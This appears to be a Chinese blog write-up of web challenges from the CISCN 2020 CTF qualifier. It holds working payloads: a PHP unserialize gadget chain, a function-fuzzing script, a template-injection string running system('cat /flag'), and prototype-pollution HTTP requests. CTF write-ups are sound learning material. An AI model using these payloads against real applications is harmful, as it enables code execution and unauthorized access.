categories:
- 比赛
tags:
- wp
- web
title: ciscn2020预选赛
---
# ciscn 2020 预选赛

## babyunserialize

和wmctf2020的webwebpayload相同



```php
<?php
namespace DB{
    abstract class Cursor  implements \IteratorAggregate {}
}


namespace DB\SQL{
    class Mapper extends \DB\Cursor{
        protected
            $props=["quotekey"=>"phpinfo"],
            $adhoc=[-1=>["expr"=>""]],
            $db;
        function offsetExists($offset){}
        function offsetGet($offset){}
        function offsetSet($offset, $value){}
        function offsetUnset($offset){}
        function getIterator(){}
        function __construct($val){
            $this->db = $val;
        }
    }
}
namespace CLI{
    class Agent {
        protected
            $server="";
        public $events;
        public function __construct(){
            $this->events=["disconnect"=>array(new \DB\SQL\Mapper(new \DB\SQL\Mapper("")),"find")];
            $this->server=&$this;


        }
    };
    class WS{}
}
namespace {
    echo urlencode(serialize(array(new \CLI\WS(),new \CLI\Agent())));
}
```



## easyphp

阅读代码我们发现:`if(!pcntl_wifexited($status)){phpinfo();}`，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。

fork子进程执行的代码是：

```php
if(isset($_GET['a'])&&is_string($_GET['a'])&&!preg_match("/[:\\\\]|exec|pcntl/i",$_GET['a'])){
            call_user_func_array($_GET['a'],[$_GET['b'],false,true]);
```

而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：

```php
<?php

    $payloads=[
        "ls",//shell命令执行测试
        "index.php",//读取文件测试
        "asdfasldfjaklsdfjl.php",//创建文件/文件夹测试
        "echo 123;"//php命令执行测试
    ];
    $str=file_get_contents("fatalerr.log");
    if(!$str){
        $str="[]";
    }
    $fatalerror=eval("return ".$str.";");
    function show_result($func,$r,$v){
        if($r==NULL){
        }
        try{
            echo "$func($v,false,true) return value:";
            var_dump($r);
            echo "<br />";
        }catch(Exception $e){}
    }

    function brute_func($a){
        global $payloads;
        global $fatalerror;
        
        foreach($a as $val){
            
            if(is_array($val)){
                brute_func($val);
                continue;
            }
            
            if(in_array($val,$fatalerror)){
                continue;
            }
            array_push($fatalerror,$val);
            file_put_contents("fatalerr.log",var_export($fatalerror,TRUE));
            foreach($payloads as $v){
                $r=NULL;
                
                $r=call_user_func_array($val,[$v,false,true]);
                show_result($val,$r,$v);
                
            }
            array_pop($fatalerror);
            
        }
    };
    $arr=get_defined_functions();
    brute_func($arr);
?>
```



多次执行发现：

```php
stream_socket_server
exec
stream_socket_client
```

这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码

但是这里只需要segment_fault,所以访问`?a=stream_socket_server&b=`拿到flag



## rceme



注意到有个eval只要绕过限制就可以执行命令了

很简单利用字符串拼接绕过

`{if:+('base64_deco'.'d'.'e')('c3lzdGVt')('cat+/flag')}{end+if}`



## easytrick

队里的师傅做出来的,dbq，我太菜了

```php
<?php
class trick{
    public $trick1;
    public $trick2;
}


$t = new trick;
$t->trick1 = "INF";
$t->trick2 = 1e1111;
echo serialize($t);

```

## littlegame

```
λ npm audit

                       === npm audit security report ===

# Run  npm update set-value --depth 1  to resolve 1 vulnerability

  High            Prototype Pollution

  Package         set-value

  Dependency of   set-value

  Path            set-value

  More info       https://npmjs.com/advisories/1012



found 1 high severity vulnerability in 61 scanned packages
  run `npm audit fix` to fix 1 of them.
```

原型链污染，poc地址：
https://snyk.io/vuln/SNYK-JS-SETVALUE-450213

- 先访问一次`/SpawnPoint`，拿个sessionid
- 然后访问`/Privilege`污染原型链（用`constructor.prototype`或者`__proto__`均可）
- 最后访问`/DeveloperControlPanel`拿flag

```
POST /Privilege HTTP/1.1
Host: host
Content-Type: application/x-www-form-urlencoded
Cookie: session=yoursession

NewAttributeValue=abc&NewAttributeKey=__proto__.password4

POST /DeveloperControlPanel HTTP/1.1
Host: host
Content-Type: application/x-www-form-urlencoded
Cookie: session=yoursession

key=password4&password=abc
```